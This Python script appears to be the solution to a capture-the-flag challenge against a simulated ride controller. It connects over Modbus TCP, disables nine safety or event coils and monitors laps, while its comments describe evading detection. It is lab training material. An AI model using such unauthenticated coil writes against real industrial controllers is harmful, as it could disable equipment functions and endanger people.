#!/usr/bin/env python3
"""
CTF Challenge 10: Ghost Mode
Difficulty: Expert
Points: 500

Objective: Complete 3 full cycles with all 9 events disabled simultaneously

Requirements:
- Disable all 9 events while the ride is running
- Maintain ride operation for 3 complete cycles
- The web interface will detect this achievement and award the flag

Solution: Requires disabling every event while maintaining ride operation
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_10_ghost_mode.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 10: Ghost in the Machine")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Failed to connect")
        sys.exit(1)

    print("[+] Connected")
    print("[*] This challenge requires perfect stealth...")
    print("[*] We must modify 3+ parameters without detection")
    print()

    # Read initial values
    print("[*] Reading initial state...")
    cycle_start = client.read_holding_registers(2051, 2)  # MD3 - cycle_counter
    alarm_start = client.read_holding_registers(1054, 1)  # MW30 - alarm_register
    stealth_start = client.read_holding_registers(1055, 1)  # MW31 - stealth_counter

    if not (cycle_start.isError() or alarm_start.isError() or stealth_start.isError()):
        initial_cycles = cycle_start.registers[1]  # Lower word of DINT
        initial_alarm = alarm_start.registers[0]
        initial_stealth = stealth_start.registers[0]

        print(f"[*] Initial cycles: {initial_cycles}")
        print(f"[*] Initial alarm: {initial_alarm}")
        print(f"[*] Initial stealth: {initial_stealth}")
    else:
        print("[!] Failed to read initial values")
        client.close()
        sys.exit(1)

    print("\n[*] Executing Ghost Mode attack...")
    print("[*] Disabling ALL 9 events simultaneously...")

    # Disable all 9 events (coils 8-16)
    for event_num in range(1, 10):
        coil_addr = 7 + event_num  # event_1_enable = coil 8, etc.
        result = client.write_coil(coil_addr, False)
        if result.isError():
            print(f"[!] Failed to disable Event {event_num}")
        else:
            print(f"[+] Event {event_num} disabled")
        time.sleep(0.1)

    # Verify all events are disabled
    print("\n[*] Verifying all events are disabled...")
    verify = client.read_coils(8, 9)
    if not verify.isError():
        all_disabled = all(not bit for bit in verify.bits[:9])
        if all_disabled:
            print("[+] All 9 events confirmed DISABLED")
        else:
            enabled_events = [i+1 for i, bit in enumerate(verify.bits[:9]) if bit]
            print(f"[!] Some events still enabled: {enabled_events}")

    print("\n[*] Monitoring for 3 complete cycles...")
    print("[*] Ride must complete 3 laps with all events disabled")

    # Monitor position for lap counting
    last_position = -1
    lap_count = 0
    timeout = 180  # 3 minutes timeout
    start_time = time.time()

    while lap_count < 3 and (time.time() - start_time) < timeout:
        # Read current position
        pos_result = client.read_holding_registers(1, 1)  # current_position
        if not pos_result.isError():
            current_pos = pos_result.registers[0]

            # Detect lap completion (position wraps from 26 back to 0)
            if current_pos < 5 and last_position > 20:
                lap_count += 1
                print(f"\n[+] Lap {lap_count}/3 completed!")

                # Verify events are still disabled
                verify = client.read_coils(8, 9)
                if not verify.isError():
                    disabled_count = sum(1 for bit in verify.bits[:9] if not bit)
                    print(f"[*] Events disabled: {disabled_count}/9")

            last_position = current_pos

            # Show progress
            print(f"\r[*] Position: {current_pos:2d} | Laps: {lap_count}/3", end="", flush=True)

        time.sleep(0.2)

    if lap_count >= 3:
        # Final verification
        verify = client.read_coils(8, 9)
        if not verify.isError():
            all_disabled = all(not bit for bit in verify.bits[:9])
            if all_disabled:
                print("\n\n[+] GHOST MODE ACHIEVED!")
                print("[+] Completed 3 full cycles with all events disabled!")
                print("[*] Check the web interface for flag capture notification")
            else:
                print("\n\n[!] Some events were re-enabled during cycles")
    else:
        print("\n\n[!] Timeout - did not complete 3 cycles in time")

    client.close()

if __name__ == "__main__":
    main()
